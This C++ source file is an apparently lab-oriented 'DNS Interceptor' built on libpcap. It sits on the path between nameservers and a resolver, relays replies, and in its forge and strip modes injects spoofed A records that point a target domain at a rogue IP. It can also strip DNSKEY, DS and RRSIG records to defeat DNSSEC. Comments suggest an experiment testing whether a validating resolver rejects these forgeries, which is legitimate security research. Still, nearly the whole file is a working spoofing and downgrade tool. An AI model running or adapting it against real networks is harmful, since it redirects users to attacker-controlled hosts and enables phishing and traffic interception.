#define _GNU_SOURCE 1
#define _DEFAULT_SOURCE 1

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <fstream>
#include <sstream>

// // DNS Header structure
// id: 16-bit Transaction ID (TXID). The response must match the query's TXID.
// flags: Contains the Query/Response bit (QR), Opcode, Authoritative Answer bit (AA), Truncation (TC), Recursion Desired (RD), Recursion Available (RA), and Response Code (RCODE).
// qdcount: Number of queries in the Question section (normally 1).
// ancount: Number of Resource Records in the Answer section.
// nscount: Number of Name Server Resource Records in Authority section.
// arcount: Number of Resource Records in Additional section.
struct dnshdr {
    uint16_t id;  // Transaction ID (TXID)
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

enum class Mode {
    RELAY,
    FORGE,
    STRIP
};

// Configuration options
struct Config {
    std::string iface = "eth0";
    Mode mode = Mode::RELAY;
    bool strip_parent = false;
    std::string target_domain = "example.com";
    std::string rogue_ip = "172.16.1.30";
    std::string resolver_ip = "172.16.2.10";
    std::string tld_ns_ip = "172.16.3.20";
    std::string domain_ns_ip = "172.16.3.30";
    uint8_t attacker_mac[6];
    uint8_t resolver_mac[6];
    bool have_resolver_mac = false;
};

static Config config;
static pcap_t *pcap_handle = nullptr;

// Compute Internet Checksum (RFC 1071)
uint16_t compute_checksum(const uint16_t *buf, int nwords) {
    uint32_t sum = 0;
    for (int i = 0; i < nwords; i++) {
        sum += ntohs(buf[i]);
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return htons(~sum);
}

// UDP pseudo-header for checksum calculation
// Under RFC 768, UDP checksums are calculated not just over the UDP header and payload, but also over a pseudo-header containing the IP source, IP destination, protocol number (17 for UDP), and UDP length.
struct PseudoHeader {
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t reserved;
    uint8_t protocol;
    uint16_t udp_len;
};

uint16_t compute_udp_checksum(const struct iphdr *ip, const struct udphdr *udp, const uint8_t *payload, int payload_len) {
    PseudoHeader psh;
    psh.src_ip = ip->saddr;
    psh.dst_ip = ip->daddr;
    psh.reserved = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_len = udp->len;

    int total_len = sizeof(PseudoHeader) + ntohs(udp->len);
    // If length is odd, pad with zero
    int buf_len = (total_len + 1) & ~1;
    std::vector<uint8_t> buf(buf_len, 0);

    memcpy(buf.data(), &psh, sizeof(PseudoHeader));
    memcpy(buf.data() + sizeof(PseudoHeader), udp, sizeof(struct udphdr));
    // Zero out checksum in copy
    struct udphdr *copied_udp = reinterpret_cast<struct udphdr*>(buf.data() + sizeof(PseudoHeader));
    copied_udp->check = 0;

    if (payload_len > 0) {
        memcpy(buf.data() + sizeof(PseudoHeader) + sizeof(struct udphdr), payload, payload_len);
    }

    return compute_checksum(reinterpret_cast<uint16_t*>(buf.data()), buf_len / 2);
}

// Get MAC address of local interface
bool get_interface_mac(const std::string &ifname, uint8_t mac[6]) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    struct ifreq ifr;
    strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    close(sock);

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return true;
}

// Find MAC address of target IP from /proc/net/arp
bool lookup_arp_cache(const std::string &ip_str, uint8_t mac[6]) {
    std::ifstream arp_file("/proc/net/arp");
    if (!arp_file.is_open()) return false;

    std::string line;
    // Skip header
    std::getline(arp_file, line);

    while (std::getline(arp_file, line)) {
        std::istringstream iss(line);
        std::string ip, hw_type, flags, mac_str, mask, dev;
        if (iss >> ip >> hw_type >> flags >> mac_str >> mask >> dev) {
            if (ip == ip_str && mac_str != "00:00:00:00:00:00") {
                unsigned int m[6];
                if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
                           &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                    for (int i = 0; i < 6; i++) mac[i] = static_cast<uint8_t>(m[i]);
                    return true;
                }
            }
        }
    }
    return false;
}

// Resolve MAC via ping, ip neigh, or arping
bool ensure_resolver_mac() {
    for (int attempt = 0; attempt < 5; attempt++) {
        if (lookup_arp_cache(config.resolver_ip, config.resolver_mac)) {
            config.have_resolver_mac = true;
            return true;
        }

        // Check ip neigh
        std::string ip_cmd = "ip neigh show " + config.resolver_ip + " 2>/dev/null";
        FILE *pipe = popen(ip_cmd.c_str(), "r");
        if (pipe) {
            char buf[256];
            if (fgets(buf, sizeof(buf), pipe)) {
                std::string s(buf);
                size_t pos = s.find("lladdr ");
                if (pos != std::string::npos) {
                    std::string mstr = s.substr(pos + 7, 17);
                    unsigned int m[6];
                    if (sscanf(mstr.c_str(), "%x:%x:%x:%x:%x:%x",
                               &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                        for (int i = 0; i < 6; i++) config.resolver_mac[i] = static_cast<uint8_t>(m[i]);
                        pclose(pipe);
                        config.have_resolver_mac = true;
                        return true;
                    }
                }
            }
            pclose(pipe);
        }

        // Trigger ARP by pinging
        std::string cmd = "ping -c 1 -W 1 " + config.resolver_ip + " >/dev/null 2>&1";
        system(cmd.c_str());
        cmd = "arping -c 1 -w 1 -I " + config.iface + " " + config.resolver_ip + " >/dev/null 2>&1";
        system(cmd.c_str());
        usleep(100000); // 100ms
    }

    return false;
}

// Parse domain name from DNS question section
std::string parse_dns_qname(const uint8_t *dns_payload, int payload_len, int offset, int &bytes_read) {
    std::string domain;
    int curr = offset;
    bool jumped = false;

    while (curr < payload_len) {
        uint8_t len = dns_payload[curr];
        if (len == 0) {
            if (!jumped) bytes_read = (curr + 1) - offset;
            break;
        }

        // Pointer
        if ((len & 0xC0) == 0xC0) {
            if (curr + 1 >= payload_len) break;
            if (!jumped) {
                bytes_read = (curr + 2) - offset;
                jumped = true;
            }
            int ptr = ((len & 0x3F) << 8) | dns_payload[curr + 1];
            curr = ptr;
            continue;
        }

        curr++;
        if (curr + len > payload_len) break;

        if (!domain.empty()) domain += ".";
        domain.append(reinterpret_cast<const char*>(dns_payload + curr), len);
        curr += len;

        if (!jumped) bytes_read = curr - offset;
    }

    return domain;
}

uint16_t read_u16(const uint8_t *data) {
    uint16_t value;
    memcpy(&value, data, sizeof(value));
    return ntohs(value);
}

bool skip_dns_name(const uint8_t *dns, int dns_len, int &offset) {
    while (offset < dns_len) {
        uint8_t length = dns[offset];
        if (length == 0) {
            offset++;
            return true;
        }
        if ((length & 0xc0) == 0xc0) {
            if (offset + 1 >= dns_len) return false;
            offset += 2;
            return true;
        }
        if (length > 63 || offset + 1 + length > dns_len) return false;
        offset += 1 + length;
    }
    return false;
}

// Search all resource-record sections without following compression pointers.
bool dns_message_contains_type(const uint8_t *dns, int dns_len, uint16_t wanted_type) {
    if (dns_len < static_cast<int>(sizeof(dnshdr))) return false;
    const dnshdr *header = reinterpret_cast<const dnshdr*>(dns);
    int offset = sizeof(dnshdr);

    for (int i = 0; i < ntohs(header->qdcount); i++) {
        if (!skip_dns_name(dns, dns_len, offset) || offset + 4 > dns_len) return false;
        offset += 4;
    }

    int rr_count = ntohs(header->ancount) + ntohs(header->nscount) + ntohs(header->arcount);
    for (int i = 0; i < rr_count; i++) {
        if (!skip_dns_name(dns, dns_len, offset) || offset + 10 > dns_len) return false;
        uint16_t rr_type = read_u16(dns + offset);
        uint16_t rdlength = read_u16(dns + offset + 8);
        if (offset + 10 + rdlength > dns_len) return false;
        if (rr_type == wanted_type) return true;
        offset += 10 + rdlength;
    }
    return false;
}

void append_u16(std::vector<uint8_t> &buffer, uint16_t value) {
    uint16_t network_value = htons(value);
    const uint8_t *bytes = reinterpret_cast<const uint8_t*>(&network_value);
    buffer.insert(buffer.end(), bytes, bytes + sizeof(network_value));
}

void append_u32(std::vector<uint8_t> &buffer, uint32_t value) {
    uint32_t network_value = htonl(value);
    const uint8_t *bytes = reinterpret_cast<const uint8_t*>(&network_value);
    buffer.insert(buffer.end(), bytes, bytes + sizeof(network_value));
}

void append_dns_name(std::vector<uint8_t> &buffer, const std::string &name) {
    size_t start = 0;
    while (start < name.size()) {
        size_t dot = name.find('.', start);
        size_t end = (dot == std::string::npos) ? name.size() : dot;
        size_t length = end - start;
        buffer.push_back(static_cast<uint8_t>(length));
        buffer.insert(buffer.end(), name.begin() + start, name.begin() + end);
        if (dot == std::string::npos) break;
        start = dot + 1;
    }
    buffer.push_back(0);
}

// Inject a replacement DNS payload while preserving the genuine packet's IPs and UDP ports.
void inject_dns_payload(const struct iphdr *orig_ip,
                        const struct udphdr *orig_udp,
                        const std::vector<uint8_t> &dns_payload,
                        const std::string &description) {
    int ip_header_len = orig_ip->ihl * 4;
    int frame_len = sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr) + dns_payload.size();
    std::vector<uint8_t> frame(frame_len, 0);

    struct ether_header *eth = reinterpret_cast<struct ether_header*>(frame.data());
    memcpy(eth->ether_dhost, config.resolver_mac, 6);
    memcpy(eth->ether_shost, config.attacker_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    struct iphdr *ip = reinterpret_cast<struct iphdr*>(frame.data() + sizeof(struct ether_header));
    memcpy(ip, orig_ip, ip_header_len);
    ip->tot_len = htons(ip_header_len + sizeof(struct udphdr) + dns_payload.size());
    ip->check = 0;
    ip->check = compute_checksum(reinterpret_cast<uint16_t*>(ip), ip->ihl * 2);

    struct udphdr *udp = reinterpret_cast<struct udphdr*>(frame.data() + sizeof(struct ether_header) + ip_header_len);
    memcpy(udp, orig_udp, sizeof(struct udphdr));
    udp->len = htons(sizeof(struct udphdr) + dns_payload.size());
    udp->check = 0;
    udp->check = compute_udp_checksum(ip, udp, dns_payload.data(), dns_payload.size());

    memcpy(frame.data() + sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr),
           dns_payload.data(), dns_payload.size());

    if (pcap_inject(pcap_handle, frame.data(), frame.size()) >= 0) {
        std::cout << "[+] " << description << std::endl;
    } else {
        std::cerr << "[-] Error injecting replacement packet: " << pcap_geterr(pcap_handle) << std::endl;
    }
}

bool copy_header_and_question(const uint8_t *orig_dns,
                              int orig_dns_len,
                              int qname_bytes,
                              std::vector<uint8_t> &dns_buffer) {
    int question_len = qname_bytes + 4;
    int prefix_len = sizeof(dnshdr) + question_len;
    if (qname_bytes <= 0 || prefix_len > orig_dns_len) return false;
    dns_buffer.assign(orig_dns, orig_dns + prefix_len);
    return true;
}

// Return only the original question. For a secure delegation, the missing
// DNSSEC proof is bogus rather than evidence that the child is unsigned.
void inject_question_only(const struct iphdr *orig_ip,
                          const struct udphdr *orig_udp,
                          const uint8_t *orig_dns,
                          int orig_dns_len,
                          int qname_bytes,
                          const std::string &description) {
    std::vector<uint8_t> dns_buffer;
    if (!copy_header_and_question(orig_dns, orig_dns_len, qname_bytes, dns_buffer)) return;

    dnshdr *header = reinterpret_cast<dnshdr*>(dns_buffer.data());
    header->qdcount = htons(1);
    header->ancount = htons(0);
    header->nscount = htons(0);
    header->arcount = htons(0);
    inject_dns_payload(orig_ip, orig_udp, dns_buffer, description);
}

// Build a normal-looking unsigned referral for example.com. A validating
// resolver still rejects it in Run A because the signed com zone promises a DS.
void inject_referral_without_ds(const struct iphdr *orig_ip,
                                const struct udphdr *orig_udp,
                                const uint8_t *orig_dns,
                                int orig_dns_len,
                                int qname_bytes) {
    std::vector<uint8_t> dns_buffer;
    if (!copy_header_and_question(orig_dns, orig_dns_len, qname_bytes, dns_buffer)) return;

    dnshdr *header = reinterpret_cast<dnshdr*>(dns_buffer.data());
    header->qdcount = htons(1);
    header->ancount = htons(0);
    header->nscount = htons(1);
    header->arcount = htons(1);

    // Authority: example.com. NS domain-ns.example.com.
    dns_buffer.push_back(0xc0);
    dns_buffer.push_back(0x0c);
    append_u16(dns_buffer, 2);   // NS
    append_u16(dns_buffer, 1);   // IN
    append_u32(dns_buffer, 600); // TTL
    std::vector<uint8_t> ns_name;
    append_dns_name(ns_name, "domain-ns.example.com");
    append_u16(dns_buffer, ns_name.size());
    dns_buffer.insert(dns_buffer.end(), ns_name.begin(), ns_name.end());

    // Additional: glue A for domain-ns.example.com.
    append_dns_name(dns_buffer, "domain-ns.example.com");
    append_u16(dns_buffer, 1);   // A
    append_u16(dns_buffer, 1);   // IN
    append_u32(dns_buffer, 600); // TTL
    append_u16(dns_buffer, 4);
    struct in_addr ns_address;
    inet_pton(AF_INET, config.domain_ns_ip.c_str(), &ns_address);
    const uint8_t *address_bytes = reinterpret_cast<const uint8_t*>(&ns_address.s_addr);
    dns_buffer.insert(dns_buffer.end(), address_bytes, address_bytes + 4);

    inject_dns_payload(orig_ip, orig_udp, dns_buffer,
                       "Stripped DS/RRSIG from com referral (unsigned referral injected)");
}

// Relay a packet to resolver by rewriting Ethernet addresses and recomputing checksums
void relay_packet(const uint8_t *packet, int length) {
    if (length < static_cast<int>(sizeof(struct ether_header))) return;

    std::vector<uint8_t> relayed(packet, packet + length);
    struct ether_header *eth = reinterpret_cast<struct ether_header*>(relayed.data());

    memcpy(eth->ether_dhost, config.resolver_mac, 6);
    memcpy(eth->ether_shost, config.attacker_mac, 6);

    // Recompute IP and UDP checksums because captured packets on virtual bridges have offload dummy checksums!
    if (ntohs(eth->ether_type) == ETHERTYPE_IP && length >= static_cast<int>(sizeof(struct ether_header) + sizeof(struct iphdr))) {
        struct iphdr *ip = reinterpret_cast<struct iphdr*>(relayed.data() + sizeof(struct ether_header));
        int ip_len = ip->ihl * 4;
        ip->check = 0;
        ip->check = compute_checksum(reinterpret_cast<uint16_t*>(ip), ip->ihl * 2);

        if (ip->protocol == IPPROTO_UDP && length >= static_cast<int>(sizeof(struct ether_header) + ip_len + sizeof(struct udphdr))) {
            struct udphdr *udp = reinterpret_cast<struct udphdr*>(relayed.data() + sizeof(struct ether_header) + ip_len);
            int udp_data_len = ntohs(udp->len) - sizeof(struct udphdr);
            const uint8_t *udp_payload = relayed.data() + sizeof(struct ether_header) + ip_len + sizeof(struct udphdr);
            udp->check = 0;
            udp->check = compute_udp_checksum(ip, udp, udp_payload, udp_data_len);
        }
    }

    if (pcap_inject(pcap_handle, relayed.data(), relayed.size()) < 0) {
        std::cerr << "[-] pcap_inject error: " << pcap_geterr(pcap_handle) << std::endl;
    }
}

// Construct and inject forged DNS response
void forge_and_inject(const struct iphdr *orig_ip,
                      const struct udphdr *orig_udp,
                      const uint8_t *orig_dns,
                      int orig_dns_len,
                      uint16_t orig_txid,
                      int qname_bytes) {
    // Question section size = qname_bytes + 2 (type) + 2 (class)
    int question_len = qname_bytes + 4;
    if (sizeof(dnshdr) + question_len > static_cast<size_t>(orig_dns_len)) {
        return;
    }

    // Prepare forged DNS payload:
    // Header (12 bytes) + Question + Answer (16 bytes)
    // Answer: 2 bytes name ptr (0xc00c) + 2 bytes type (A) + 2 bytes class (IN) + 4 bytes TTL + 2 bytes rdlength + 4 bytes IPv4
    int answer_len = 2 + 2 + 2 + 4 + 2 + 4;
    int forged_dns_len = sizeof(dnshdr) + question_len + answer_len;
    std::vector<uint8_t> dns_buf(forged_dns_len, 0);

    dnshdr *dns = reinterpret_cast<dnshdr*>(dns_buf.data());
    dns->id = htons(orig_txid);
    // Flags: QR=1 (response), AA=1 (authoritative), RD=1 (recursion desired), RA=1 (recursion available), RCODE=0 (no error)
    // 0x8580: standard authoritative response with RD and RA set
    dns->flags = htons(0x8580);
    dns->qdcount = htons(1);
    dns->ancount = htons(1);
    dns->nscount = htons(0);
    dns->arcount = htons(0);

    // Copy original question
    memcpy(dns_buf.data() + sizeof(dnshdr), orig_dns + sizeof(dnshdr), question_len);

    // Append Answer record
    uint8_t *ans = dns_buf.data() + sizeof(dnshdr) + question_len;
    // Pointer to QNAME at offset 12 (0xc00c)
    ans[0] = 0xc0;
    ans[1] = 0x0c;
    // Type A (1)
    ans[2] = 0x00; ans[3] = 0x01;
    // Class IN (1)
    ans[4] = 0x00; ans[5] = 0x01;
    // TTL: 600 seconds (0x00000258)
    ans[6] = 0x00; ans[7] = 0x00; ans[8] = 0x02; ans[9] = 0x58;
    // RDLENGTH: 4
    ans[10] = 0x00; ans[11] = 0x04;
    // RDATA: rogue_ip (e.g. 172.16.1.30)
    struct in_addr rogue_addr;
    inet_pton(AF_INET, config.rogue_ip.c_str(), &rogue_addr);
    memcpy(ans + 12, &rogue_addr.s_addr, 4);

    std::ostringstream description;
    description << "Unsigned forged A injected: " << config.target_domain
                << " -> " << config.rogue_ip
                << " (TXID: 0x" << std::hex << orig_txid << std::dec
                << ", UDP port: " << ntohs(orig_udp->dest) << ")";
    inject_dns_payload(orig_ip, orig_udp, dns_buf, description.str());
}

// Packet callback handler
void packet_handler(u_char *user, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    if (pkthdr->caplen < sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)) {
        return;
    }

    const struct ether_header *eth = reinterpret_cast<const struct ether_header*>(packet);
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;

    const struct iphdr *ip = reinterpret_cast<const struct iphdr*>(packet + sizeof(struct ether_header));
    if (ip->protocol != IPPROTO_UDP) return;

    int ip_header_len = ip->ihl * 4;
    const struct udphdr *udp = reinterpret_cast<const struct udphdr*>(packet + sizeof(struct ether_header) + ip_header_len);

    int udp_len = ntohs(udp->len);
    int dns_offset = sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr);
    int dns_len = udp_len - sizeof(struct udphdr);

    if (dns_offset + dns_len > static_cast<int>(pkthdr->caplen) || dns_len < static_cast<int>(sizeof(dnshdr))) {
        return;
    }

    const uint8_t *dns_payload = packet + dns_offset;
    const dnshdr *dns = reinterpret_cast<const dnshdr*>(dns_payload);

    uint16_t qdcount = ntohs(dns->qdcount);
    uint16_t ancount = ntohs(dns->ancount);
    uint16_t txid = ntohs(dns->id);

    char src_ip_str[INET_ADDRSTRLEN];
    char dst_ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(ip->saddr), src_ip_str, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(ip->daddr), dst_ip_str, INET_ADDRSTRLEN);

    // Extract Question Name and Type
    int bytes_read = 0;
    std::string qname = "";
    uint16_t qtype = 0;
    if (qdcount > 0) {
        qname = parse_dns_qname(dns_payload, dns_len, sizeof(dnshdr), bytes_read);
        if (sizeof(dnshdr) + bytes_read + 2 <= static_cast<size_t>(dns_len)) {
            qtype = read_u16(dns_payload + sizeof(dnshdr) + bytes_read);
        }
    }

    bool attack_mode = config.mode == Mode::FORGE || config.mode == Mode::STRIP;
    bool is_child_a = (attack_mode &&
                       qname == config.target_domain &&
                       qtype == 1 &&
                       ancount > 0 &&
                       std::string(src_ip_str) == config.domain_ns_ip);
    bool is_child_dnskey = (config.mode == Mode::STRIP &&
                            qname == config.target_domain &&
                            qtype == 48 &&
                            std::string(src_ip_str) == config.domain_ns_ip);
    bool is_parent_with_ds = (config.mode == Mode::STRIP &&
                              config.strip_parent &&
                              qname == config.target_domain &&
                              std::string(src_ip_str) == config.tld_ns_ip &&
                              dns_message_contains_type(dns_payload, dns_len, 43));

    if (is_child_a) {
        std::cout << "[*] Intercepted target response for: " << qname 
                  << " (type A) from " << src_ip_str 
                  << " (ANCOUNT=" << ancount << ")" << std::endl;
        forge_and_inject(ip, udp, dns_payload, dns_len, txid, bytes_read);
    } else if (is_child_dnskey) {
        std::cout << "[*] Intercepted DNSKEY response for " << qname << std::endl;
        inject_question_only(ip, udp, dns_payload, dns_len, bytes_read,
                             "Stripped child DNSKEY/RRSIG records");
    } else if (is_parent_with_ds) {
        std::cout << "[*] Intercepted parent response containing example.com DS" << std::endl;
        if (qtype == 1) {
            inject_referral_without_ds(ip, udp, dns_payload, dns_len, bytes_read);
        } else {
            inject_question_only(ip, udp, dns_payload, dns_len, bytes_read,
                                 "Stripped DS/RRSIG from explicit DS response");
        }
    } else {
        relay_packet(packet, pkthdr->caplen);
    }
}

int main(int argc, char *argv[]) {
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--forge") {
            config.mode = Mode::FORGE;
        } else if (arg == "--strip") {
            config.mode = Mode::STRIP;
        } else if (arg == "--strip-parent") {
            config.strip_parent = true;
        } else if (arg == "--relay") {
            config.mode = Mode::RELAY;
        } else if (arg == "--iface" && i + 1 < argc) {
            config.iface = argv[++i];
        } else if (arg == "--target" && i + 1 < argc) {
            config.target_domain = argv[++i];
        } else if (arg == "--ip" && i + 1 < argc) {
            config.rogue_ip = argv[++i];
        } else if (arg == "--resolver-mac" && i + 1 < argc) {
            std::string mstr = argv[++i];
            unsigned int m[6];
            if (sscanf(mstr.c_str(), "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                for (int j = 0; j < 6; j++) config.resolver_mac[j] = static_cast<uint8_t>(m[j]);
                config.have_resolver_mac = true;
            }
        }
    }

    const char *mode_name = config.mode == Mode::RELAY ? "TRANSPARENT RELAY" :
                            config.mode == Mode::FORGE ? "FORGE ATTACK" : "STRIP AND FORGE";
    std::cout << "=== DNS Interceptor (Phase 4) ===" << std::endl;
    std::cout << "Mode: " << mode_name << std::endl;
    std::cout << "Strip parent DS: " << (config.strip_parent ? "yes" : "no") << std::endl;
    std::cout << "Target Domain: " << config.target_domain << std::endl;
    std::cout << "Rogue IP: " << config.rogue_ip << std::endl;
    std::cout << "Listening Interface: " << config.iface << std::endl;

    // Get attacker's own MAC
    if (!get_interface_mac(config.iface, config.attacker_mac)) {
        std::cerr << "[-] Failed to get MAC for " << config.iface << std::endl;
        return 1;
    }
    char mac_buf[32];
    snprintf(mac_buf, sizeof(mac_buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             config.attacker_mac[0], config.attacker_mac[1], config.attacker_mac[2],
             config.attacker_mac[3], config.attacker_mac[4], config.attacker_mac[5]);
    std::cout << "Attacker MAC: " << mac_buf << std::endl;

    // Ensure resolver MAC is resolved
    if (!config.have_resolver_mac) {
        if (!ensure_resolver_mac()) {
            std::cerr << "[-] Failed to resolve MAC for resolver at " << config.resolver_ip << std::endl;
            return 1;
        }
    }
    snprintf(mac_buf, sizeof(mac_buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             config.resolver_mac[0], config.resolver_mac[1], config.resolver_mac[2],
             config.resolver_mac[3], config.resolver_mac[4], config.resolver_mac[5]);
    std::cout << "Resolver MAC: " << mac_buf << std::endl;

    // Open pcap live capture
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(config.iface.c_str(), 65535, 1, 1, errbuf);
    if (!pcap_handle) {
        std::cerr << "[-] pcap_open_live failed: " << errbuf << std::endl;
        return 1;
    }

    // Do not capture frames injected by this process and relay them repeatedly.
    if (pcap_setdirection(pcap_handle, PCAP_D_IN) == -1) {
        std::cerr << "[-] Could not restrict capture direction: " << pcap_geterr(pcap_handle) << std::endl;
        return 1;
    }

    // Capture filter: UDP replies from nameservers destined for resolver (172.16.2.10)
    std::string bpf_filter = "ip and udp and src port 53 and dst host " + config.resolver_ip;
    struct bpf_program fp;
    if (pcap_compile(pcap_handle, &fp, bpf_filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        std::cerr << "[-] pcap_compile failed: " << pcap_geterr(pcap_handle) << std::endl;
        return 1;
    }
    if (pcap_setfilter(pcap_handle, &fp) == -1) {
        std::cerr << "[-] pcap_setfilter failed: " << pcap_geterr(pcap_handle) << std::endl;
        return 1;
    }
    pcap_freecode(&fp);

    std::cout << "[+] Interceptor ready and listening on " << config.iface << "..." << std::endl;
    pcap_loop(pcap_handle, -1, packet_handler, nullptr);

    pcap_close(pcap_handle);
    return 0;
}
